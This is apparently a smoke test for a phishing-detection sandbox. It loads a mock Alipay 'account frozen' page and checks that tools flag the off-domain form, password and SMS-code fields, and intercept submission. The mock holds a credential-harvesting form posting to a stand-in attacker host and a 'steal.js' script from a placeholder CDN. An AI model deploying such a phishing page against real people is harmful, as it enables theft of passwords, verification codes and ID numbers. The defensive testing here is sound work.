"""冒烟测试：不依赖外网与 LLM key，验证沙箱浏览器 + 工具集核心逻辑。

模拟一个钓鱼特征页面：第三方 action 表单 + 密码框 + 验证码框 + 紧迫话术。
"""
import json
import sys
from pathlib import Path

ROOT = Path(__file__).parent.parent
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT.parent))  # 允许 sandbox 包内 import

from pipeline import load_config  # noqa: E402
from sandbox.browser import SandboxBrowser  # noqa: E402
from sandbox.tools import ToolBox  # noqa: E402
from storage import db  # noqa: E402

MOCK_PAGE = """
<html><head><title>紧急！您的账户存在异常</title></head><body>
<h1>支付宝安全中心</h1>
<p>您的账户已被冻结，请立即验证身份，否则 24 小时后永久停用！</p>
<form action="http://collect.evil-top.example/harvest" method="POST">
  <input name="phone" placeholder="手机号">
  <input type="password" name="pwd" placeholder="登录密码">
  <input name="smscode" placeholder="短信验证码">
  <input name="idcard" placeholder="身份证号">
  <button type="submit">立即验证</button>
</form>
<img src="https://track.third-party.example/pixel.gif">
<script src="https://evil-cdn.example/steal.js"></script>
</body></html>
"""


def main() -> int:
    cfg = load_config()
    db_path = str(ROOT / "data/smoke-test.db")
    task_id = db.create_task(db_path, "data:mock", "mock.local")

    with SandboxBrowser(cfg, str(ROOT / cfg["storage"]["evidence_dir"])) as sb:
        assert sb.isolation in ("L1", "L2"), sb.isolation
        print(f"[OK] 浏览器启动，隔离级别={sb.isolation}")
        sb.page.set_content(MOCK_PAGE, wait_until="load")
        tb = ToolBox(sb, db_path, task_id)

        r = json.loads(tb.get_page_text())
        assert "冻结" in r["summary"] and r["text_total_chars"] > 0
        print(f"[OK] get_page_text: title={r['title']!r}, {r['text_total_chars']} 字")

        forms = json.loads(tb.get_forms())["forms"]
        f = forms[0]
        assert f["action_domain_matches_page"] is False
        assert any(fl["is_password"] for fl in f["fields"])
        assert any(fl["is_code_like"] for fl in f["fields"])
        print(f"[OK] get_forms: 1 个表单, action 域名不一致=True, "
              f"密码框=True, 验证码框=True")

        fill = json.loads(tb.fill_form_test(0))
        assert fill["ok"] and any(x["name"] == "smscode" for x in fill["skipped"])
        assert any(x["type"] == "password" for x in fill["filled"])
        print(f"[OK] fill_form_test: 填充 {len(fill['filled'])} 字段, "
              f"验证码字段跳过填充占位")

        sub = json.loads(tb.submit_intercepted(0))
        assert sub["intercepted"] is True and sub["requests_aborted"] >= 1
        assert "未到达目标服务器" in sub["note"]
        print(f"[OK] submit_intercepted: 拦截成功, abort 请求数="
              f"{sub['requests_aborted']}")

        ext = json.loads(tb.get_external_resources())
        assert "track.third-party.example" in ext["third_party_domains"]
        print(f"[OK] get_external_resources: {ext['third_party_domains']}")

        shot = json.loads(tb.screenshot())
        assert Path(shot["path"]).exists() and Path(shot["path"]).stat().st_size > 0
        print(f"[OK] screenshot: {shot['path']}")

        who = json.loads(tb.check_whois())
        print(f"[OK] check_whois: {who}")

    ev = db.list_evidence(db_path, task_id)
    print(f"[OK] 证据入库 {len(ev)} 条")
    print("\n全部冒烟测试通过 ✓")
    return 0


if __name__ == "__main__":
    sys.exit(main())
